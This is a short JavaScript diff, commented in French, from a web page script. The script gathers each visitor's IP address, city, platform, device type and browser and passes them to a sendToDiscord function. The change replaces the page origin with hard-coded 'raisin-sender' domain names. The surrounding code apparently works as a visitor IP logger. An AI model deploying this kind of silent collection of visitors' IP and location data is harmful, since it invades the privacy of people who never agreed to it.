@@ -55,7 +55,7 @@
                             var os = navigator.platform;
                             var deviceType = /Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Téléphone" : "PC";
                             var browser = navigator.userAgent;
-                            var clickedLink = window.location.origin; // Récupérer le lien du nom de domaine
+                            var clickedLink = "https://raisin-sender.fr ou https://raisin-sender.site"; // Remplacez "monsite.fr" par le nom de domaine personnalisé de votre site
                             
                             // Envoyer les informations à Discord
                             sendToDiscord(ipAddress, city, os, deviceType, browser, clickedLink);
